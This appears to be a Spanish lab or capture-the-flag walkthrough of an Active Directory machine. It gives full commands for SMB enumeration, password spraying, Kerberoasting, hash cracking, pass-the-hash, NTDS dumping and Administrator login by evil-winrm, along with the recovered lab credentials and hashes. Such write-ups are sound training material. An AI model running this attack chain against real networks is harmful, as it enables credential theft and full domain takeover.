Hacemos el escaneo con nmap:
![[Pasted image 20240923110530.png]]
![[Pasted image 20240923110627.png]]
Lo primero será enumerar recursos compartidos, lo cual podremos hacerlo:
```bash
smbclient -L //192.168.222.71/ -N
```
![[Pasted image 20240923110754.png]]
Vamos a listar los permisos con smbmap o netexec:
```bash
smbmap -H 192.168.222.71 -u 'guest' -p ''
netexec smb 192.168.222.71 -u 'guest' -p '' --shares
```
![[Pasted image 20240923111354.png]]
Ahora con netexec podemos también enumerar usuarios de la siguiente forma:
```bash
netexec smb 192.168.222.71 -u guest -p "" --rid-brute
```
![[Pasted image 20240923111506.png]]
Y para filtrar únicamente por usuarios, lo hacemos de la siguiente forma:
```bash
nxc smb 192.168.222.71 -u guest -p "" --rid-brute |  grep SidTypeUser | awk '{print $6}' | tr '\' ' ' | awk '{print $2}'
```
![[Pasted image 20240923111725.png]]
En este punto lo que podemos hacer es un password spraying para ver si el usuario es el mismo que en la contraseña en alguno de ellos:
```bash
netexec smb 192.168.222.71 -u users.txt -p users.txt --no-bruteforce
```
![[Pasted image 20240923112728.png]]
Y encontramos unas credenciales válidas:
```bash
ybob317:ybob317
```
Y ahora con estas credenciales podremos enumerar recursos compartidos:
```bash
netexec smb 192.168.222.71 -u ybob317 -p ybob317 --shares
```
![[Pasted image 20240923112825.png]]
Pero sin embargo por winrm no podemos entrar:
![[Pasted image 20240923112901.png]]
Ahora vamos a enumerar usuarios en el sistema que puedan ser vulnerables a un ataque kerberoast:
```bash
impacket-GetUserSPNs -dc-ip 192.168.222.71 soupedecode.local/ybob317:ybob317 -outputfile hash
```
![[Pasted image 20240923113307.png]]
Pero nos da el siguiente error:
![[Pasted image 20240923113320.png]]
Que se soluciona sincronizando la hora de mi máquina atacante con la del DC:
```bash
ntpdate 192.168.222.71 
```
Y ahora lanzamos el ataque:
```bash
impacket-GetUserSPNs -dc-ip 192.168.222.71 SOUPEDECODE.LOCAL/ybob317:ybob317 -outputfile archivo.hash
```
![[Pasted image 20240923114042.png]]
Vamos a crackearlos con JohnTheRipper:
```bash
john --wordlist=rockyou.txt archivo.hash
```
![[Pasted image 20240923114300.png]]
Como podemos observar, solo nos saca 1 contraseña, y no vemos a que cuenta pertenece. Para identificar a quien pertenece esa contraseña, utilizaremos netexec:
```bash
netexec smb 192.168.222.71 -u users.txt -p 'Password123!!'
```
![[Pasted image 20240923114341.png]]
```bash
file_svc:Password123!!
```
Ahora con este usuario listamos recursos compartidos y vemos que podemos leer la carpeta backup:
```bash
smbmap -H 192.168.222.71 -u file_svc -p 'Password123!!'
```
![[Pasted image 20240923114528.png]]
```bash
smbmap -H 192.168.222.71 -u file_svc -p 'Password123!!' -r backup
```
![[Pasted image 20240923114605.png]]
Nos descargamos ese archivo:
```bash
smbmap -H 192.168.222.71 -u file_svc -p 'Password123!!' --download backup/backup_extract.txt
```
![[Pasted image 20240923114713.png]]
Nos encontramos con un fichero; backup_extract.txt que parece tener muchos usuarios y hashes NTLMv1, con los que podemos realizar la técnica de pass the hash, vamos a comprobar si hay alguna credencial válida primero filtrando por los hashes:
```bash
cat 192.168.222.71-backup_backup_extract.txt | tr ':' ' ' | awk '{print $4}'
```
![[Pasted image 20240923114918.png]]
Y después filtrando por los usuarios:
```bash
cat 192.168.222.71-backup_backup_extract.txt | tr ':' ' ' | awk '{print $1}' > usuarios
```
![[Pasted image 20240923115500.png]]
Y lanzamos el ataque y vemos si algún usuario es vulnerable a pass-the-hash:
```bash
crackmapexec smb 192.168.222.71 -u usuarioss -H hashess --continue-on-success --no-brute
```
![[Pasted image 20240923115544.png]]
```bash
FileServer$:e41da7e79a4c76dbd9cf79d1cb325559
```
Vamos a dumpear el NTDS para sacar las credenciales de Administrator:
```bash
netexec smb 192.168.222.71 -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 --ntds
```
![[Pasted image 20240923115744.png]]
```bash
Administrator:88d40c3a9a98889f5cbb778b0db54a2f
```
Entonces intentamos entrar por winrm usando el hash del administrador:
```bash
evil-winrm -i 192.168.222.71 -u 'Administrator' -H '88d40c3a9a98889f5cbb778b0db54a2f'
```
![[Pasted image 20240923115902.png]]
